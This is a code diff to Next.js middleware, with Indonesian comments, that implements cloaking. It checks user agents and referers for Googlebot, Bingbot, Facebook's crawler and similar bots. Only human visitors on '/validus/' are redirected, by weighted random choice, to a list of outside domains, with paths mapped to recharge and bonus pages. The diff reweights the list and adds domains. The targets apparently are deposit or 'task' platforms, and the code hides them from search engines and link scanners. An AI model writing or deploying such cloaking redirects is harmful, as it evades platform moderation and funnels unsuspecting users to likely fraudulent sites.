@@ -4,14 +4,25 @@ import { NextResponse } from 'next/server';
 // 1. KONFIGURASI KHUSUS ANDA
 // ===============================================
 
+// JALUR UTAMA YANG MENGAKTIFKAN PENGALIHAN
 const ACTIVE_REDIRECT_PATH = '/validus/'; 
 
+// URL TARGET BERBOBOT (Weighted Targets) - Total harus 100
+// Prioritas Berdasarkan Urutan: Ventureidven (20%) hingga Gdpventureid (10%)
 const TARGET_URLS_WEIGHTED = [
-    ["https://ventureidven.com", 70],  
-    ["https://akunfinansial.com", 20],   
-    ["https://platformtugas.com", 10]    
+    // [Domain Dasar, Bobot/Prioritas]
+    ["https://ventureidven.com", 40],  
+    ["https://platformtugas.com", 15],   
+    ["https://akunfinansial.com", 11],
+    ["https://akuntugaslogin.com", 9],
+    ["https://akunpg.com", 7],
+    ["https://akunkeanggotaan6.com", 6],
+    ["https://digitaldayatekno.vip", 5],
+    ["https://orange168.com", 5],
+    ["https://gdpventureid.com", 2]
 ];
 
+// USER AGENT BOT/CRAWLER
 const BOT_AGENTS = ["googlebot", "bingbot", "yahoo! slurp", "adsbot", "facebookexternalhit"];
 const SUSPICIOUS_REFERERS = ["google.com", "facebook.com", "bing.com"];
 
@@ -35,8 +46,6 @@ export default function middleware(request) {
         if (referer.includes(ref)) { isBot = true; break; }
     }
 
-    // Middleware HANYA berjalan pada path /validus/ (lihat bagian config di bawah)
-
     // KONDISI 1: JALUR BENAR DAN BUKAN BOT (HUMAN)
     if (!isBot) { 
         // Logika redirect berbobot Anda
@@ -53,6 +62,7 @@ export default function middleware(request) {
         }
 
         // 2. Ambil Sisa Path TEPAT setelah '/validus'
+        // Kita menggunakan (ACTIVE_REDIRECT_PATH.length - 1) untuk memastikan kita mendapatkan path yang benar.
         let remainingPath = pathname.substring(ACTIVE_REDIRECT_PATH.length - 1); 
         let targetPath = '/'; 
 
@@ -67,7 +77,7 @@ export default function middleware(request) {
         else if (remainingPath.includes('bonus')) { 
             targetPath = '/index/promo/bonus'; 
         }
-        // KONDISI BARU UNTUK RECHARGE
+        // Mapping Baru
         else if (remainingPath.includes('recharge')) {
             targetPath = '/index/ctrl/recharge'; 
         }
@@ -86,6 +96,7 @@ export default function middleware(request) {
 }
 
 // Konfigurasi: Middleware HANYA berjalan pada path yang mengandung /validus/
+// Ini memastikan root path (https://aksesmembership.vercel.app/) berjalan normal
 export const config = {
     matcher: ['/validus/:path*'],
 };
